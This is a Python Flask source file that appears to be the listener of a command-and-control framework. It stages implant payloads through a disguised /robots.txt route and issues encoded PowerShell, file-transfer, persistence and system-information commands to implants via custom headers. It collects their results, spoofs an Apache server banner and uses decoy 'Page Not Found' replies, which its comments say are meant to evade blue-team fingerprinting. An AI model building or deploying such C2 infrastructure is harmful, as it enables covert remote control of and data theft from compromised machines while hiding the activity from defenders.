from flask import Flask, make_response, request
import base64
from uuid import uuid4

from Implant.Implant import ImplantSingleton
from Data.Database import Database

Imp = ImplantSingleton.instance
db = Database()

app = Flask(str(uuid4()))
app.config['SECRET_KEY'] = str(uuid4())

# Adding the functions which manage encoding built in commands for transfer
def craft_sound_file(path):
    print("Crafting audio file")
    with open(path, 'rb') as file:
        blah = "PS".encode()+base64.b64encode(file.read())

        print(type(blah))
    return blah


def craft_powershell_native_command(args):
    print(args, args['args'].encode())
    a = base64.b64encode(args['args'].encode()).decode()
    b = args['type']+a
    print(b)
    return b


def craft_file_upload(value_dict):
    return str(value_dict['type'])


def craft_file_download(value_dict):
    return str(value_dict['type'])


def craft_enable_persistence(value_dict):
    return str(value_dict['type'])


def craft_sys_info(value_dict):
    return str(value_dict['type'])

#
preprocessing = {
    "PS": craft_sound_file,
    "CM": craft_powershell_native_command,
    "FU": craft_file_upload,
    "FD": craft_file_download,
    "EP": craft_enable_persistence,
    "SI": craft_sys_info,
    }



@app.before_request
def before_request():
    # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
    return

# Removing the Werkzeug header to reduce Fudges server fingerprinting.
@app.after_request
def alter_headers(response):
    response.headers['Server'] = "Apache/2.4.1 (Unix)"
    return response


# -- TODO: extracted and added into a new stager specific listener(?)
@app.route("/robots.txt", methods=['GET'])
def Stager():
    # This endpoint is responsible for generating the implant based on stager callbacks
    implant_data = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
    if implant_data:
        output_from_parsed_template = Imp.GeneratePayload(implant_data)
        return output_from_parsed_template
    else:
        return "404", 404


@app.route("/index", methods=['GET', 'POST'])
def ImplantCheckIn():
    #
    if 'X-Implant' in request.headers:
        # Debugging:
        # print("Check in: {}".format( app.config['listener_type']))
        cmd_to_execute = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
        print(cmd_to_execute, type(cmd_to_execute))
        response = make_response("Page Not Found.")
        # if cmd_to_execute !="==":
        #     print("ImplantCheckIn: ",cmd_to_execute)
        response.headers["X-Command"] = cmd_to_execute
    else:
        response = make_response("Page Not Found")
        response.headers["X-Command"] = "=="
    return response


@app.route("/index2", methods=["GET", "POST"])
def implant_beacon_endpoint():
    if 'X-Implant' not in request.headers:
       return "404"
    print(request.data)
    # This will be replaced by the check for a valid implant_id in production.
    if request.headers['X-Implant'] == "870428":
        next_cmd = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
        print(preprocessing[next_cmd['type']])
        processed_return_val = preprocessing[next_cmd['type']](next_cmd)
        # We process the next_cmd dictionary to determine any unique pre-processing we must perform
        print(len(processed_return_val))
        return processed_return_val

    return "0"



@app.route("/help", methods=['GET', 'POST'])
def ImplantCommandResult():
    # -- X-Result is a placeholder header and should be changed to a more realistic value
    if "X-Result" in request.headers:
        decoded_response = base64.b64decode(request.headers["X-Result"]).decode('utf-16').split("::", 1)
        Imp.CommandResponse(decoded_response[0], decoded_response[1], app.config['listener_type'])
    return "Page Not Found"


# This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
@app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
def ShutdownListener():
    if request.remote_addr == "127.0.0.1":
        print ("blah")
        shutdown_hook = request.environ.get('werkzeug.server.shutdown')
        if shutdown_hook is not None:
            shutdown_hook()
        # raise RuntimeError("Server going down")

def shutdown():
    raise RuntimeError("Server going down")